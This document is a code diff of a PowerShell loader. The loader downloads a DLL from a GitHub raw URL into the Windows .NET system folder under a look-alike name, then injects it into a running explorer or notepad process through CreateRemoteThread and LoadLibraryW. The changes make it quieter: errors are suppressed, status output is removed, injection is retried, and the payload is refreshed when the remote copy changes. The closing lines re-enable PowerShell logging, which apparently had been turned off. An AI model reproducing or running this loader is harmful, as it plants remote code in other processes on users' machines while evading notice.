@@ -1,77 +1,73 @@
-$ErrorActionPreference = 'Continue'
-Write-Host "[*] Starting..."
-
-# DLL settings
+$ErrorActionPreference = 'SilentlyContinue'
 $dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
 $dllUri = "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll"
+$dllName = [System.IO.Path]::GetFileName($dllPath)
 
-# Download
-Write-Host "[*] Downloading DLL..."
-New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
-try {
-    Invoke-WebRequest -Uri $dllUri -OutFile $dllPath -ErrorAction Stop
-    Write-Host "[+] DLL downloaded ($((Get-Item $dllPath).Length) bytes)"
-} catch {
-    Write-Host "[-] Download failed: $_"
-    exit
+# Compare local DLL with remote (only download if different or missing)
+$needDownload = $true
+if (Test-Path $dllPath) {
+    $localHash = (Get-FileHash -Path $dllPath -Algorithm SHA256).Hash
+    $tmpFile = "$env:TEMP\temp_dll_check.dll"
+    try {
+        Invoke-WebRequest -Uri $dllUri -OutFile $tmpFile -ErrorAction Stop
+        $remoteHash = (Get-FileHash -Path $tmpFile -Algorithm SHA256).Hash
+        if ($localHash -eq $remoteHash) { $needDownload = $false; Remove-Item $tmpFile -Force }
+        else { Move-Item -Force $tmpFile $dllPath }
+    } catch { }
+}
+if ($needDownload -and -not (Test-Path $dllPath)) {
+    New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
+    try { Invoke-WebRequest -Uri $dllUri -OutFile $dllPath -ErrorAction Stop } catch { exit }
 }
 
-# Check architecture
+# Read DLL architecture
 $dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
 $peOffset = [System.BitConverter]::ToInt32($dllBytes, 0x3C)
 $machine = [System.BitConverter]::ToUInt16($dllBytes, $peOffset + 4)
 $is64 = $machine -eq 0x8664
-Write-Host "[*] DLL is $((Get-Item $dllPath).Length) bytes, machine type = 0x$($machine.ToString('X')) ($(if($is64){'64-bit'}else{'32-bit'}))"
 
-# Choose target
+# Pick target process (existing, no kill/start)
 if ($is64) {
-    $targetName = 'explorer'
-    $targetPath = "$env:SystemRoot\explorer.exe"
+    $targetProcName = 'explorer'
 } else {
-    if ([Environment]::Is64BitOperatingSystem) {
-        $targetName = 'notepad'
-        $targetPath = "$env:SystemRoot\SysWOW64\notepad.exe"
-    } else {
-        $targetName = 'notepad'
-        $targetPath = "$env:SystemRoot\System32\notepad.exe"
-    }
+    if ([Environment]::Is64BitOperatingSystem) { $targetProcName = 'notepad' }
+    else { $targetProcName = 'notepad' }
 }
-Write-Host "[*] Target: $targetName ($targetPath)"
 
-# Stop existing target and start new
-Get-Process -Name $targetName -ErrorAction SilentlyContinue | Stop-Process -Force
-Start-Sleep 2
-$proc = Start-Process -FilePath $targetPath -PassThru -WindowStyle Hidden
-Start-Sleep 2
-if ($proc.HasExited) {
-    Write-Host "[-] Target process exited immediately"
-    exit
+$targetProc = Get-Process -Name $targetProcName -ErrorAction SilentlyContinue | Select-Object -First 1
+if (-not $targetProc) {
+    # If notepad not running, start it (explorer is always running)
+    if ($targetProcName -eq 'notepad') {
+        Start-Process -FilePath "$env:SystemRoot\System32\notepad.exe" -WindowStyle Hidden
+        Start-Sleep 2
+        $targetProc = Get-Process -Name notepad -ErrorAction SilentlyContinue | Select-Object -First 1
+    }
+    if (-not $targetProc) { exit }
 }
-Write-Host "[+] Target PID: $($proc.Id)"
 
 # C# injector
 Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
-public class DiagInj {
-    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
-    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
-    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
-    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
-    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
-    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
-    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
-    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
-    [DllImport("kernel32")] public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
-    [DllImport("kernel32")] public static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
-    [DllImport("kernel32")] public static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
-    [DllImport("kernel32")] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
+public class Inj {
+    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
+    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
+    [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);
+    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32")] static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
+    [DllImport("kernel32")] static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
+    [DllImport("kernel32")] static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
+    [DllImport("kernel32")] static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
 
     const uint TH32CS_SNAPMODULE = 0x00000008;
     const uint TH32CS_SNAPMODULE32 = 0x00000010;
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct MODULEENTRY32 {
+    struct MODULEENTRY32 {
         public uint dwSize;
         public uint th32ModuleID;
         public uint th32ProcessID;
@@ -99,47 +95,44 @@ public class DiagInj {
         return false;
     }
 
-    public static string ClassicInject(int pid, string dllPath) {
+    public static bool ClassicInject(int pid, string dllPath) {
         IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
-        if (hProcess == IntPtr.Zero) return "OpenProcess failed: " + Marshal.GetLastWin32Error();
+        if (hProcess == IntPtr.Zero) return false;
         byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
         uint dllSize = (uint)dllBytes.Length;
         IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllSize, 0x3000, 0x4);
-        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); return "VirtualAllocEx failed: " + Marshal.GetLastWin32Error(); }
+        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); return false; }
         uint written;
         WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, out written);
-        if (written != dllSize) { CloseHandle(hProcess); return "WriteProcessMemory incomplete"; }
         IntPtr kernel32 = GetModuleHandle("kernel32.dll");
         IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
         IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, remoteMem, 0, IntPtr.Zero);
-        if (remoteThread == IntPtr.Zero) { CloseHandle(hProcess); return "CreateRemoteThread failed: " + Marshal.GetLastWin32Error(); }
+        if (remoteThread == IntPtr.Zero) { CloseHandle(hProcess); return false; }
         WaitForSingleObject(remoteThread, 0xFFFFFFFF);
         uint exitCode;
         GetExitCodeThread(remoteThread, out exitCode);
         CloseHandle(remoteThread);
         CloseHandle(hProcess);
-        return exitCode != 0 ? "OK" : "LoadLibrary returned NULL";
+        return exitCode != 0;
     }
 }
 '@ -ReferencedAssemblies System.Runtime.InteropServices
 
-$dllName = [System.IO.Path]::GetFileName($dllPath)
-$result = [DiagInj]::ClassicInject($proc.Id, $dllPath)
-Write-Host "[*] Injection result: $result"
-
-if ($result -eq "OK") {
-    Start-Sleep -Milliseconds 500
-    $loaded = [DiagInj]::IsModuleLoaded($proc.Id, $dllName)
-    if ($loaded) {
-        Write-Host "[+] DLL loaded in target"
-    } else {
-        Write-Host "[-] Module not found in process (maybe unloaded or blocked)"
+# Inject and verify
+$injected = $false
+for ($i = 0; $i -lt 3; $i++) {
+    if ([Inj]::ClassicInject($targetProc.Id, $dllPath)) {
+        Start-Sleep -Milliseconds 500
+        if ([Inj]::IsModuleLoaded($targetProc.Id, $dllName)) {
+            $injected = $true
+            break
+        }
     }
-} else {
-    Write-Host "[-] Injection failed: $result"
+    Start-Sleep 1
 }
+if ($injected) { Write-Host "Injected" }
 
-# Re-enable logging
+# Re-enable PowerShell logging (defence in depth)
 $basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
 Set-ItemProperty -Path "$basePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force
 Set-ItemProperty -Path "$basePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force
@@ -147,4 +140,3 @@ Set-ItemProperty -Path "$basePath\Transcription" -Name 'EnableTranscripting' -Va
 $corePath = 'HKLM:\Software\Policies\Microsoft\PowerShellCore'
 if (Test-Path "$corePath\ScriptBlockLogging") { Set-ItemProperty -Path "$corePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force }
 if (Test-Path "$corePath\ModuleLogging") { Set-ItemProperty -Path "$corePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force }
-Write-Host "[*] Logging re-enabled"
